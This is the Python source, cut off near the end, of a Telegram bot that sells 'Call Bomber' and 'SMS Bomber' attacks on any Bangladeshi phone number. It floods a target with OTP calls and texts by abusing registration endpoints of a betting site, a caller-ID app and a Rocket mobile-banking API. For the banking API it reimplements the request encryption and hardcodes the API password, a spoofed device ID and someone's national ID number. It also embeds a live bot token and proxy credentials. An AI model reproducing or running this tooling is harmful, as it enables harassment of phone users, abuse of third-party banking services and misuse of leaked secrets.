import os
import sys
import json
import time
import sqlite3
import asyncio
import urllib.request
import urllib.error
import urllib.parse
import requests
import random
import re
from datetime import datetime, timedelta
from typing import Dict, Any, Optional, Tuple

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# Cryptography imports for AES-256-GCM and PBKDF2 (Rocket API)
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
import base64

# ==========================================
# CONFIGURATION & CONSTANTS
# ==========================================
BOT_TOKEN = "8240474292:AAEfini_pLQSNMhIu2OqOp13p09zE59U8C0"
ADMIN_ID = 7740120627  # Your Admin Chat ID
DB_NAME = "bot_database.db"

# Rocket API Constants
API_PASSWORD   = "sdfheu$*sdfGw2"
BASIC_AUTH     = "cm9ja2V0LWFwcC1lbmM6UmsjdDQwY2tFdCoj"
BASE_URL       = "https://rocket-consumertxnservice.dutchbanglabank.com/apigw/v1"
DEVICE_ID      = "ANDROID-01968184976"
DEVICE_INFO    = "SP1A.210812.016-itel S665L"
CLIENT_VERSION = "3.1.6"
DEFAULT_NID    = "5845888855"

# Cooldown dictionary to track last attack time per user {user_id: timestamp}
cooldowns = {}
COOLDOWN_TIME = 60  # 60 seconds cooldown for normal users

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            name TEXT,
            role TEXT DEFAULT 'User',
            trial_uses INTEGER DEFAULT 2,
            sub_expiry TEXT,
            total_refers INTEGER DEFAULT 0,
            referred_by INTEGER DEFAULT 0,
            is_banned INTEGER DEFAULT 0
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS redeem_codes (
            code TEXT PRIMARY KEY,
            days INTEGER
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    """)
    conn.commit()
    conn.close()

init_db()

def get_setting(key, default_val=""):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT value FROM settings WHERE key = ?", (key,))
    row = cursor.fetchone()
    conn.close()
    return row[0] if row else default_val

def set_setting(key, value):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit()
    conn.close()

def get_user(user_id, name="User"):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id, name, role, trial_uses, sub_expiry, total_refers, referred_by, is_banned FROM users WHERE user_id = ?", (user_id,))
    user = cursor.fetchone()
    if not user:
        cursor.execute("""
            INSERT INTO users (user_id, name, role, trial_uses, sub_expiry, total_refers, referred_by, is_banned)
            VALUES (?, ?, 'User', 2, '', 0, 0, 0)
        """, (user_id, name))
        conn.commit()
        cursor.execute("SELECT user_id, name, role, trial_uses, sub_expiry, total_refers, referred_by, is_banned FROM users WHERE user_id = ?", (user_id,))
        user = cursor.fetchone()
    conn.close()
    return user

def update_user_field(user_id, field, value):
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute(f"UPDATE users SET {field} = ? WHERE user_id = ?", (value, user_id))
    conn.commit()
    conn.close()

def is_subscribed(user_id):
    if user_id == ADMIN_ID:
        return True
    user = get_user(user_id)
    sub_expiry = user[4]
    if not sub_expiry:
        return False
    try:
        expiry_date = datetime.strptime(sub_expiry, "%Y-%m-%d %H:%M:%S")
        if datetime.now() < expiry_date:
            return True
    except:
        pass
    return False

# ==========================================
# ROCKET API CRYPTOGRAPHY & HELPERS
# ==========================================
def get_key(salt: bytes) -> bytes:
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=65536,
    )
    return kdf.derive(API_PASSWORD.encode('utf-8'))

def encrypt_payload(payload: dict) -> str:
    raw_bytes = json.dumps(payload, separators=(',', ':')).encode('utf-8')
    iv = os.urandom(16)
    salt = os.urandom(16)
    key = get_key(salt)
    aesgcm = AESGCM(key)
    ct_and_tag = aesgcm.encrypt(iv, raw_bytes, None)
    combined = iv + salt + ct_and_tag
    return base64.b64encode(combined).decode('utf-8')

def decrypt_payload(b64_str: str) -> dict:
    try:
        raw = base64.b64decode(b64_str)
        iv = raw[:16]
        salt = raw[16:32]
        ct_and_tag = raw[32:]
        key = get_key(salt)
        aesgcm = AESGCM(key)
        pt = aesgcm.decrypt(iv, ct_and_tag, None)
        return json.loads(pt.decode('utf-8'))
    except Exception as e:
        raise Exception(f"Decryption failed: {str(e)}")

def make_ref_id(prefix: str = "login") -> str:
    now = time.time()
    dt = time.strftime('%Y%m%d%H%M%S', time.localtime(now))
    ms = f"{int((now % 1) * 1000):03d}"
    time.sleep(random.randint(1000, 50000) / 1000000.0)
    return f"{prefix}--{dt}{ms}"

def rocket_api_call(endpoint: str, payload: dict, token: Optional[str] = None) -> dict:
    auth_header = f"Bearer {token}" if token else f"Basic {BASIC_AUTH}"
    headers = {
        "Authorization": auth_header,
        "CHANNEL_ID": "ROCKET_APP_USER",
        "Content-Type": "application/json; charset=utf-8",
        "Host": "rocket-consumertxnservice.dutchbanglabank.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip",
        "User-Agent": "okhttp/4.9.3",
    }
    encrypted_data = encrypt_payload(payload)
    body = {"userData": encrypted_data}
    url = f"{BASE_URL}/{endpoint}"
    
    response = requests.post(url, json=body, headers=headers, timeout=15)
    if response.status_code >= 400:
        raise Exception(f"HTTP {response.status_code}: {response.text}")
    result = response.json()
    if "userData" in result and result["userData"]:
        return decrypt_payload(result["userData"])
    return result

def process_rocket_registration(phone: str, nid: str) -> Tuple[dict, int]:
    if not phone:
        return {"error": "Phone number required"}, 400
    if not re.match(r"^01[0-9]{9}$", phone):
        return {"error": "Invalid phone number"}, 400
    if not nid:
        return {"error": "NID required"}, 400

    result = {"phone": phone, "nid": nid, "steps": [], "success": False}
    try:
        login_resp = rocket_api_call("login", {
            "apiId": 102,
            "deviceId": DEVICE_ID,
            "deviceInfo": DEVICE_INFO,
            "clientVersion": CLIENT_VERSION,
            "refId": make_ref_id("login"),
            "sessionId": "123",
            "clientLanguage": "EN",
            "data": {
                "appType": "C",
                "rocketSessionId": "1234",
                "userId": phone,
                "version": CLIENT_VERSION
            }
        })

        if login_resp.get("status") != "SUCCESS":
            result["steps"].append({"step": "login", "status": "FAILED", "message": login_resp.get("message", "")})
            return result, 200

        token = login_resp.get("data", {}).get("accessToken")
        session_id = login_resp.get("data", {}).get("sessionId")
        result["steps"].append({"step": "login", "status": "SUCCESS"})

        svc_payload = {
            "apiId": 3042,
            "deviceId": DEVICE_ID,
            "deviceInfo": DEVICE_INFO,
            "clientVersion": CLIENT_VERSION,
            "refId": make_ref_id("reg-init"),
            "sessionId": session_id,
            "clientLanguage": "EN",
            "data": {
                "appType": "C",
                "initiatorId": phone,
                "rocketSessionId": "7654321",
                "userId": "",
                "version": CLIENT_VERSION,
                "deviceType": "ANDROID"
            }
        }
        user_resp = rocket_api_call("userService", svc_payload, token)
        user_data = user_resp.get("data") or {}
        user_type = user_data.get("userType", "?")
        promt_user = user_data.get("promtUser", "")

        result["steps"].append({
            "step": "userService",
            "status": user_resp.get("status", ""),
            "userType": user_type,
            "promtUser": promt_user,
            "message": user_resp.get("message", "")
        })

        if user_resp.get("status") != "SUCCESS":
            result["error"] = user_resp.get("message", "userService failed")
            return result, 200

        if user_type == "NEW":
            nid_resp = rocket_api_call("userService", {
                "apiId": 3002,
                "deviceId": DEVICE_ID,
                "deviceInfo": DEVICE_INFO,
                "clientVersion": CLIENT_VERSION,
                "refId": make_ref_id("nid-check"),
                "sessionId": session_id,
                "clientLanguage": "EN",
                "data": {
                    "nidNo": nid,
                    "initiatorId": phone
                }
            }, token)

            result["steps"].append({"step": "nid_check", "status": nid_resp.get("status", ""), "message": nid_resp.get("message", "")})

            try:
                final_resp = rocket_api_call("userService", {
                    "apiId": 3034,
                    "deviceId": DEVICE_ID,
                    "deviceInfo": DEVICE_INFO,
                    "clientVersion": CLIENT_VERSION,
                    "refId": make_ref_id("reg-init"),
                    "sessionId": "123",
                    "clientLanguage": "EN",
                    "data": {
                        "appType": "C",
                        "initiatorId": phone,
                        "rocketSessionId": "7654321",
                        "userId": "",
                        "version": CLIENT_VERSION,
                        "deviceType": "ANDROID"
                    }
                }, token)

                result["steps"].append({"step": "final_trigger", "status": final_resp.get("status", ""), "message": final_resp.get("message", "")})
            except Exception as e:
                result["steps"].append({"step": "final_trigger", "status": "ERROR", "message": str(e)})

            if promt_user == "Y":
                result["success"] = True
                result["callWillCome"] = True

        elif user_type == "OLD":
            result["success"] = True
            result["alreadyRegistered"] = True

    except Exception as e:
        result["error"] = str(e)

    return result, 200


# ==========================================
# CALL BOMBER API FUNCTIONS
# ==========================================
def call_88mbets(clean_number):
    try:
        proxy_host = "p.webshare.io"
        proxy_port = "80"
        proxy_user = "ahgqhhwq-rotate"
        proxy_pass = "15dzbyne9f6m"
        
        proxy_url = f"http://{proxy_user}:{proxy_pass}@{proxy_host}:{proxy_port}"
        proxy_handler = urllib.request.ProxyHandler({
            'http': proxy_url,
            'https': proxy_url
        })
        
        opener = urllib.request.build_opener(proxy_handler)
        
        url = 'https://www.8mbets.net/api/user/request-register-tac'
        payload = {
            "uname": f"880{clean_number}",
            "sendType": "mobile",
            "country_code": "880",
            "currency": "BDT",
            "mobileno": clean_number,
            "language": "bn",
            "langCountry": "bn-bd"
        }

        headers = {
            'host': 'www.8mbets.net',
            'domain': 'www.8mbets.net',
            'sec-ch-ua-platform': '"Android"',
            'lang': 'bn-bd',
            'pwa': '0',
            'sec-ch-ua': '"Android WebView";v="153", "Not_A Brand";v="8", "Chromium";v="153"',
            'page': '/bn-bd/register',
            'sec-ch-ua-mobile': '?1',
            'device': 'mobile',
            'user-agent': 'Mozilla/5.0 (Linux; Android 16; RMX3933 Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.8010.39 Mobile Safari/537.36',
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://www.8mbets.net',
            'x-requested-with': 'mark.via.gp',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.8mbets.net/bn-bd/register',
            'accept-encoding': 'gzip, deflate, br, zstd',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'priority': 'u=1, i'
        }

        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(url, data=data, headers=headers, method='POST')
        with opener.open(req, timeout=8) as response:
            pass
    except Exception as e:
        print(f"8mbets Call Bomber Error: {e}")

def call_eyecon(clean_number):
    try:
        eyecon_url = "https://api.eyecon-app.com/app/cli_auth/gettransport"
        formatted_cli = f"880{clean_number}"
        params = {
            'cv': 'vc_739_vn_4.2026.02.19.1555_a',
            'cli': formatted_cli,
            'reg_id': '',
            'is_already_social_auth': 'false',
            'installer_name': 'manually or unknown source',
            'n_sims': '1',
            'time': str(int(time.time() * 1000)),
            'is_sms_sending_available': 'true',
            'is_whatsapp_installed': 'false',
            'mc': '51:32:4E:5B:2A:8C',
            'device_id': '14d03a7cf44a4000',
            'time_zone': 'Asia/Dhaka',
            'device_manu': 'Google',
            'device_model': 'Pixel 4'
        }
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip',
            'accept-charset': 'UTF-8',
            'content-type': 'application/x-www-form-urlencoded; charset=utf-8'
        }
        requests.get(eyecon_url, params=params, headers=headers, timeout=8)
    except Exception as e:
        print(f"Eyecon Bomber Error: {e}")

def call_kgf(number):
    try:
        clean_num = number.lstrip('0')
        if len(clean_num) > 10:
            clean_num = clean_num[-10:]
        formatted_number = f"0{clean_num}"

        kgf_api_url = f"https://api-modifyxhub.tech/custom.php?api_action=live-call&number={formatted_number}"
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 13; RMX3933) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9,bn;q=0.8",
            "Referer": "https://api-modifyxhub.tech/",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        }
        
        session = requests.Session()
        session.get(kgf_api_url, headers=headers, timeout=12, verify=False)
    except Exception as e:
        print(f"KGF Call Bomber API Error: {e}")

def call_rocket(full_phone):
    try:
        process_rocket_registration(full_phone, DEFAULT_NID)
    except Exception as e:
        print(f"Rocket API Bomber Error: {e}")

# ==========================================
# COMBINED CALL BOMBER EXECUTION
# ==========================================
def execute_call_bomber(number):
    clean_number = number.lstrip('0')
    if len(clean_number) > 10:
        clean_number = clean_number[-10:]
    
    full_phone = f"0{clean_number}" if not clean_number.startswith("0") else clean_number

    call_88mbets(clean_number)
    call_eyecon(clean_number)
    call_kgf(number)
    call_rocket(full_phone)

def execute_sms_bomber(number):
    clean_number = number.lstrip('0')
    if len(clean_number) > 10:
        clean_number = clean_number[-10:]

    apis = [
        f"https://ansar.baribd.eu.cc/freehostingc/api1.php?number={clean_number}",
        f"http://ansar.baribd.eu.cc/freehostingc/api2.php?number={clean_number}",
        f"http://ansar.baribd.eu.cc/freehostingc/api3.php?number={clean_number}",
        f"http://ansar.baribd.eu.cc/freehostingc/api4.php?number={clean_number}",
        f"http://ansar.baribd.eu.cc/freehostingc/api5.php?number={clean_number}"
    ]

    for api_url in apis:
        try:
            headers = {'User-Agent': 'Mozilla/5.0'}
            req = urllib.request.Request(api_url, headers=headers, method='GET')
            urllib.request.urlopen(req, timeout=3)
        except Exception as e:
            print(f"API Request Error ({api_url}): {e}")

def main_menu_keyboard():
    keyboard = [
        [KeyboardButton("🚀 Call Bomber"), KeyboardButton("💬 SMS Bomber")],
        [KeyboardButton("🛒 Buy Subscription"), KeyboardButton("👤 Profile")],
        [KeyboardButton("🎁 Refer & Earn"), KeyboardButton("🎟️ Redeem Code")],
        [KeyboardButton("📞 Support")]
    ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    db_user = get_user(user.id, user.first_name)
    
    if db_user[7] == 1 and user.id != ADMIN_ID:
        await update.message.reply_text("❌ You are banned from using this bot.")
        return

    args = context.args
    referrer_id = int(args[0]) if args and args[0].isdigit() else 0
    if referrer_id and referrer_id != user.id and db_user[6] == 0:
        update_user_field(user.id, "referred_by", referrer_id)
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("UPDATE users SET total_refers = total_refers + 1 WHERE user_id = ?", (referrer_id,))
        cursor.execute("SELECT total_refers, name FROM users WHERE user_id = ?", (referrer_id,))
        ref_data = cursor.fetchone()
        conn.commit()
        conn.close()
        
        # Check if referrer reached a multiple of 5 refers
        if ref_data:
            total_ref = ref_data[0]
            ref_name = ref_data[1]
            if total_ref > 0 and total_ref % 5 == 0:
                try:
                    await context.bot.send_message(
                        ADMIN_ID,
                        f"🎁 *New Referral Milestone Reached!*\n\n"
                        f"👤 User: {ref_name} (`{referrer_id}`)\n"
                        f"📊 Total Refers: {total_ref}\n\n"
                        f"Click below to approve 2 days of premium:",
                        parse_mode="Markdown",
                        reply_markup=InlineKeyboardMarkup([[
                            InlineKeyboardButton("✅ Approve 2 Days", callback_data=f"app_ref_{referrer_id}")
                        ]])
                    )
                except Exception as e:
                    print(f"Error notifying admin: {e}")

        try:
            await context.bot.send_message(referrer_id, "🎉 New user joined via your invite link! Keep referring to unlock free premium.")
        except:
            pass

    welcome_text = (
        f"👋 Hello *{user.first_name}*!\n\n"
        f"🤖 *ANSAR BOT* তে স্বাগতম!\n"
        f"📞 Bangladesh-এর যেকোনো নাম্বারে SMS & Call Bombing করুন।"
    )

    try:
        photos = await context.bot.get_user_profile_photos(user.id, limit=1)
        if photos.total_count > 0:
            photo_file_id = photos.photos[0][-1].file_id
            await update.message.reply_photo(
                photo=photo_file_id,
                caption=welcome_text,
                parse_mode="Markdown",
                reply_markup=main_menu_keyboard()
            )
        else:
            await update.message.reply_text(
                welcome_text,
                parse_mode="Markdown",
                reply_markup=main_menu_keyboard()
            )
    except Exception:
        await update.message.reply_text(
            welcome_text,
            parse_mode="Markdown",
            reply_markup=main_menu_keyboard()
        )

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id != ADMIN_ID:
        return
    
    admin_keyboard = [
        [InlineKeyboardButton("📊 Bot Statistics", callback_data="adm_stats"), InlineKeyboardButton("👥 User List", callback_data="adm_users")],
        [InlineKeyboardButton("➕ Add Redeem Code", callback_data="adm_add_code"), InlineKeyboardButton("🛒 Edit Sub Message", callback_data="adm_set_sub")],
        [InlineKeyboardButton("📢 Broadcast Message", callback_data="adm_broadcast")]
    ]
    await update.message.reply_text("⚙️ *Admin Control Panel*\n\nTo give direct subscription use:\n`/give_sub <user_id> <days>`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(admin_keyboard))

async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    if user_id != ADMIN_ID:
        return

    data = query.data
    
    # Handle Referral Approval
    if data.startswith("app_ref_"):
        target_user_id = int(data.split("_")[2])
        u = get_user(target_user_id)
        current_expiry = datetime.now()
        if u[4]:
            try:
                parsed_exp = datetime.strptime(u[4], "%Y-%m-%d %H:%M:%S")
                if parsed_exp > datetime.now():
                    current_expiry = parsed_exp
            except:
                pass
        new_expiry = current_expiry + timedelta(days=2)
        update_user_field(target_user_id, "sub_expiry", new_expiry.strftime("%Y-%m-%d %H:%M:%S"))
        
        await query.message.edit_text(f"✅ Successfully approved 2 days premium for user `{target_user_id}`!", parse_mode="Markdown")
        try:
            await context.bot.send_message(
                target_user_id,
                "🎉 অভিনন্দন! আপনার ৫টি সফল রেফার যাচাই করা হয়েছে। অ্যাডমিন আপনাকে সফলভাবে ২ দিনের প্রিমিয়াম সাবস্ক্রিপশন প্রদান করেছেন! 🚀",
                parse_mode="Markdown"
            )
        except:
            pass
        return

    if data == "adm_stats":
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("SELECT COUNT(*) FROM users")
        total_users = cursor.fetchone()[0]
        cursor.execute("SELECT COUNT(*) FROM users WHERE is_banned = 1")
        total_banned = cursor.fetchone()[0]
        conn.close()
        await query.message.reply_text(f"📊 *Bot Statistics*\n\n👤 Total Users: *{total_users}*\n🚫 Banned Users: *{total_banned}*", parse_mode="Markdown")
    elif data == "adm_users":
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("SELECT user_id, name, is_banned FROM users LIMIT 30")
        rows = cursor.fetchall()
        conn.close()
        msg = "👥 *Registered Users (Up to 30):*\n\n"
        for r in rows:
            status = "🚫 Banned" if r[2] == 1 else "🟢 Active"
            msg += f"ID: `{r[0]}` | Name: {r[1]} | {status}\n"
        msg += "\nTo ban/unban use:\n`/ban <user_id>`\n`/unban <user_id>`\n\nTo give subscription use:\n`/give_sub <user_id> <days>`"
        await query.message.reply_text(msg, parse_mode="Markdown")
    elif data == "adm_add_code":
        context.user_data['waiting_for'] = 'create_code'
        await query.message.reply_text("✏️ Send code and days in format: `CODE DAYS` (e.g. `FREE3DAYS 3`)", parse_mode="Markdown")
    elif data == "adm_set_sub":
        context.user_data['waiting_for'] = 'set_sub_msg'
        await query.message.reply_text("✏️ Send the new message you want to display for 'Buy Subscription':")
    elif data == "adm_broadcast":
        context.user_data['waiting_for'] = 'broadcast_msg'
        await query.message.reply_text("📢 Send the message you want to broadcast to all users:")

async def give_sub_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    args = context.args
    if len(args) < 2 or not args[0].isdigit() or not args[1].isdigit():
        await update.message.reply_text("Use format: `/give_sub <user_id> <days>`", parse_mode="Markdown")
        return
    
    target_id = int(args[0])
    days = int(args[1])
    
    u = get_user(target_id)
    current_expiry = datetime.now()
    if u[4]:
        try:
            parsed_exp = datetime.strptime(u[4], "%Y-%m-%d %H:%M:%S")
            if parsed_exp > datetime.now():
                current_expiry = parsed_exp
        except:
            pass
    new_expiry = current_expiry + timedelta(days=days)
    update_user_field(target_id, "sub_expiry", new_expiry.strftime("%Y-%m-%d %H:%M:%S"))
    
    await update.message.reply_text(f"✅ Successfully given {days} days subscription to user `{target_id}`!\nNew Expiry: `{new_expiry.strftime('%Y-%m-%d %H:%M:%S')}`", parse_mode="Markdown")
    try:
        await context.bot.send_message(target_id, f"🎉 অভিনন্দন! অ্যাডমিন আপনাকে সফলভাবে *{days} দিনের* প্রিমিয়াম সাবস্ক্রিপশন প্রদান করেছেন।")
    except:
        pass

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text("Use: `/ban <user_id>`", parse_mode="Markdown")
        return
    target_id = int(args[0])
    update_user_field(target_id, "is_banned", 1)
    await update.message.reply_text(f"✅ User `{target_id}` has been banned.", parse_mode="Markdown")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return
    args = context.args
    if not args or not args[0].isdigit():
        await update.message.reply_text("Use: `/unban <user_id>`", parse_mode="Markdown")
        return
    target_id = int(args[0])
    update_user_field(target_id, "is_banned", 0)
    await update.message.reply_text(f"✅ User `{target_id}` has been unbanned.", parse_mode="Markdown")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    db_user = get_user(user_id)
    if db_user[7] == 1 and user_id != ADMIN_ID:
        return

    text = update.message.text.strip()
    
    # Handle Reply Keyboard Menu Clicks
    if text in ["🚀 Call Bomber", "📞 Call Bomber"]:
        context.user_data['waiting_for'] = 'call_number'
        await update.message.reply_text("📞 Enter Target Number for CALL:\n(Example: 017XXXXXXXX)", reply_markup=main_menu_keyboard())
        return
    elif text in ["💬 SMS Bomber"]:
        context.user_data['waiting_for'] = 'sms_number'
        await update.message.reply_text("💬 Enter Target Number for SMS:\n(Example: 017XXXXXXXX)", reply_markup=main_menu_keyboard())
        return
    elif text in ["🛒 Buy Subscription"]:
        custom_sub_text = get_setting("buy_sub_text", "⚠️ দুঃখিত, বর্তমানে সাবস্ক্রিপশন বিক্রি বন্ধ আছে। পরবর্তীতে আবার চেষ্টা করুন।")
        await update.message.reply_text(custom_sub_text, parse_mode="Markdown", reply_markup=main_menu_keyboard())
        return
    elif text in ["👤 Profile"]:
        u = get_user(user_id)
        is_sub = is_subscribed(user_id)
        role = "Admin ⚡" if user_id == ADMIN_ID else ("PRO 🌟" if is_sub else u[2])
        sub_status = f"Active 🟢 (Ends: {u[4]})" if is_sub else "Inactive 🔴"
        profile_text = (
            f"👤 *My Profile*\n\n"
            f"🆔 User ID: `{u[0]}`\n"
            f"👤 Name: *{u[1]}*\n"
            f"🛡️ Role: {role}\n"
            f"🎁 Trial Uses: {'Unlimited ♾️' if user_id == ADMIN_ID else u[3]}\n"
            f"👑 Subscription: {sub_status}\n"
            f"👥 Total Refers: {u[5]}"
        )
        await update.message.reply_text(profile_text, parse_mode="Markdown", reply_markup=main_menu_keyboard())
        return
    elif text in ["🎁 Refer & Earn"]:
        bot_username = context.bot.username
        invite_link = f"https://t.me/{bot_username}?start={user_id}"
        ref_text = (
            f"🎁 *Refer & Earn*\n\n"
            f"🔗 Invite Link:\n`{invite_link}`\n\n"
            f"🎁 Reward: প্রতি ৫ জন সফল রেফারে পাবেন ২ দিনের Premium Subscription!\n\n"
            f"⚠️ নোট: ৫ জন পূর্ণ হলে অ্যাডমিনের কাছে নোটিফিকেশন যাবে এবং যাচাই করে ২ দিনের প্রিমিয়াম যুক্ত করে দেওয়া হবে।"
        )
        await update.message.reply_text(ref_text, parse_mode="Markdown", reply_markup=main_menu_keyboard())
        return
    elif text in ["🎟️ Redeem Code"]:
        context.user_data['waiting_for'] = 'redeem_input'
        await update.message.reply_text("🎟️ অনুগ্রহ করে আপনার রিডিম কোডটি পাঠান:", reply_markup=main_menu_keyboard())
        return
    elif text in ["📞 Support"]:
        support_text = (
            f"🏛️ *Support Center*\n\n"
            f"👨‍💻 Admin: `@ansar_dev`\n"
            f"🤖 Dev: `@ansar_dev`"
        )
        await update.message.reply_text(support_text, parse_mode="Markdown", reply_markup=main_menu_keyboard())
        return

    waiting_for = context.user_data.get('waiting_for')

    # Cooldown Check for Attack Actions (Only for non-admin users)
    if waiting_for in ['call_number', 'sms_number'] and user_id != ADMIN_ID:
        current_time = time.time()
        last_time = cooldowns.get(user_id, 0)
        if current_time - last_time < COOLDOWN_TIME:
            remaining = int(COOLDOWN_TIME - (current_time - last_time))
            await update.message.reply_text(f"⏳ সার্ভারের লোড কমাতে দয়া করে আরও *{remaining} সেকেন্ড* অপেক্ষা করুন। তারপর আবার ট্রাই করুন।", parse_mode="Markdown", reply_markup=main_menu_keyboard())
            context.user_data['waiting_for'] = None
            return

    if waiting_for == 'call_number':
        context.user_data['waiting_for'] = None
        if not text.isdigit() or len(text) < 10:
            await update.message.reply_text("❌ Invalid mobile number format.", reply_markup=main_menu_keyboard())
            return
        
        u = get_user(user_id)
        if user_id != ADMIN_ID:
            if not is_subscribed(user_id) and u[3] <= 0:
                await update.message.reply_text("❌ Your trial uses have ended! Please subscribe or refer friends.", reply_markup=main_menu_keyboard())
                return
            if not is_subscribed(user_id):
                update_user_field(user_id, "trial_uses", u[3] - 1)
            cooldowns[user_id] = time.time()

        msg = await update.message.reply_text(f"🚀 *CALL Attack Started!*\n📱 Target: `{text}`", parse_mode="Markdown")
        
        for _ in range(3):
            await asyncio.to_thread(execute_call_bomber, text)
            await asyncio.sleep(1)
            
        await msg.edit_text(f"✅ *CALL Attack Successfully শেষ হয়েছে!*\n📱 Target: `{text}`", parse_mode="Markdown")
        await update.message.reply_text("☺️মেনু থেকে পরবর্তী কাজ বেছে নিন:", reply_markup=main_menu_keyboard())

    elif waiting_for == 'sms_number':
        context.user_data['waiting_for'] = None
        if not text.isdigit() or len(text) < 10:
            await update.message.reply_text("❌ Invalid mobile number format.", reply_markup=main_menu_keyboard())
            return
        
        u = get_user(user_id)
        if user_id != ADMIN_ID:
            if not is_subscribed(user_id) and u[3] <= 0:
                await update.message.reply_text("❌ Your trial uses have ended! Please subscribe or refer friends.", reply_markup=main_menu_keyboard())
                return
            if not is_subscribed(user_id):
                update_user_field(user_id, "trial_uses", u[3] - 1)
            cooldowns[user_id] = time.time()

        msg = await update.message.reply_text(f"💬 *SMS Attack Started via New APIs!*\n📱 Target: `{text}`", parse_mode="Markdown")
        
        await asyncio.to_thread(execute_sms_bomber, text)
        await asyncio.sleep(2)
        
        await msg.edit_text(f"✅ *SMS Attack Successfully শেষ হয়েছে!*\n📱 Target: `{text}`", parse_mode="Markdown")
        await update.message.reply_text("☺️মেনু থেকে পরবর্তী কাজ বেছে নিন:", reply_markup=main_menu_keyboard())

    elif waiting_for == 'redeem_input':
        context.user_data['waiting_for'] = None
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("SELECT days FROM redeem_codes WHERE code = ?", (text,))
        res = cursor.fetchone()
        if res:
            days = res[0]
            cursor.execute("DELETE FROM redeem_codes WHERE code = ?", (text,))
            conn.commit()
            conn.close()

            u = get_user(user_id)
            current_expiry = datetime.now()
            if u[4]:
                try:
                    parsed_exp = datetime.strptime(u[4], "%Y-%m-%d %H:%M:%S")
                    if parsed_exp > datetime.now():
                        current_expiry = parsed_exp
                except:
                    pass
            new_expiry = current_expiry + timedelta(days=days)
            update_user_field(user_id, "sub_expiry", new_expiry.strftime("%Y-%m-%d %H:%M:%S"))
            await update.message.reply_text(f"🎉 Success! Premium added for {days} days.", reply_markup=main_menu_keyboard())
        else:
            conn.close()
            await update.message.reply_text("❌ Invalid or expired redeem code.", reply_markup=main_menu_keyboard())

    elif waiting_for == 'create_code' and user_id == ADMIN_ID:
        context.user_data['waiting_for'] = None
        parts = text.split()
        if len(parts) == 2:
            code, days = parts[0], int(parts[1])
            conn = sqlite3.connect(DB_NAME)
            cursor = conn.cursor()
            cursor.execute("INSERT OR REPLACE INTO redeem_codes (code, days) VALUES (?, ?)", (code, days))
            conn.commit()
            conn.close()
            await update.message.reply_text(f"✅ Redeem code `{code}` created for {days} days.", parse_mode="Markdown")
        else:
            await update.message.reply_text("❌ Format incorrect. Use: `CODE DAYS`")

    elif waiting_for == 'set_sub_msg' and user_id == ADMIN_ID:
        context.user_data['waiting_for'] = None
        set_setting("buy_sub_text", text)
        await update.message.reply_text("✅ Buy Subscription message updated successfully!")

    elif waiting_for == 'broadcast_msg' and user_id == ADMIN_ID:
        context.user_data['waiting_for'] = None
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("SELECT user_id FROM users")
        all_users = cursor.fetchall()
        conn.close()

        success, failed = 0, 0
        status_msg = await update.message.reply_text("📢 Broadcasting message...")
        for u in all_users:
            try:
